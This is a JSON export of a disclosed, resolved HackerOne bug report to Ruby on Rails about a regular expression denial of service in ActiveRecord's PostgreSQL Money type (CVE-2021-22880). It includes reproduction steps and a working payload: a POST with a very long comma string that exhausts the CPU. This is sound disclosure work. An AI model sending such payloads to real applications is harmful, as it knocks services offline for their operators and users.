{
  "id": 1023899,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDIzODk5",
  "url": "https://hackerone.com/reports/1023899",
  "title": "Regular expression denial of service in ActiveRecord's PostgreSQL Money type",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-11-01T14:22:54.661Z",
  "submitted_at": "2020-11-01T14:22:54.710Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "dee-see",
    "url": "/dee-see",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22,
    "url": "https://hackerone.com/rails",
    "handle": "rails",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby on Rails",
      "twitter_handle": "rails",
      "website": "http://rubyonrails.org/security",
      "about": "Web development that doesn't hurt."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2021-22880"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-02-11T00:13:07.326Z",
  "bug_reporter_agreed_on_going_public_at": "2021-02-11T00:13:07.269Z",
  "team_member_agreed_on_going_public_at": "2021-02-10T23:52:23.937Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\n\nHello team! The regular expressions used in the [Money](https://github.com/rails/rails/blob/ddd0e9b/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb#L29) type to convert strings like `-$100,000.00` to `100000` have an execution time with a quadratic growth proportional to the length of the string.\n\nCausing the denial of service requires very long strings but if the parameter is in a post body that won't be a problem.\n\n## Details\n\nThe regular expressions marked `(1)` and `(2)` in [the following code](https://github.com/rails/rails/blob/ddd0e9b/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb#L28-L33) are the vulnerable expressions\n\n```ruby\n            case value\n            when /^-?\\D*[\\d,]+\\.\\d{2}$/  # (1)\n              value.gsub!(/[^-\\d.]/, \"\")\n            when /^-?\\D*[\\d.]+,\\d{2}$/  # (2)\n              value.gsub!(/[^-\\d,]/, \"\").sub!(/,/, \".\")\n            end\n```\n\nThis code is invoked when Rails saves a user-input value in a `Money` field. If we look at the first expression, the problem comes from this bit `\\D*[\\d,]+`. It matches \"not a number\" 0 or more times and then \"a number or a ,\" one or more times. The `,` can match both expressions so this is somewhat equivalent to `,*,+` as far as the attack is concerned and is where the `O(n^2)` execution time comes from.\n\n## Steps to reproduce\n\nI'm going to assume PostgreSQL is installed and configured on the machine.\n\nNow we'll install the PostgreSQL ruby interface, setup a rails application and scaffold a view for the attack.\n\n```ruby\ngem install pg\nrails new moneydos --database=postgresql\ncd moneydos\nrails db:setup\nrails g scaffold Money amount:money\nrake db:migrate\n```\n\nNow in the `rails console` run these commands. (The same could be accomplished though the UI, but this is simpler for reproduction purpose)\n\n```ruby\napp.host = 'localhost'\napp.get '/money'\ntoken = app.session[:_csrf_token]\napp.post '/money/', params: {money: {amount: (\"$\" + \",\"*100000 + \".11!\")}, authenticity_token: token}\n```\n\nThe last line takes 40 seconds to execute on my machine. Add a 0 to the `\",\"*100000` part and the CPU will pretty much spin forever. An attacker could repeat those requests many times to reach full saturation of the host's CPU capabilities and achieve a complete denial of service.\n\n## Impact\n\nDenial of service and 100% CPU usage in situations where a malicious user is able to input money amounts in a request body (web shops come to mind as the obvious target)",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-03-12T23:52:24.045Z",
  "allow_singular_disclosure_after": -92239543.13511464,
  "singular_disclosure_allowed": true,
  "vote_count": 32,
  "voters": [
    "sw33tlie",
    "w31rd0",
    "mainteemoforfun",
    "rzx007x",
    "vp40",
    "pirateducky",
    "ali",
    "akashhamal0x01",
    "sakshamguruji",
    "h4x0r_dz",
    "and 22 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 160,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/rails/rails",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
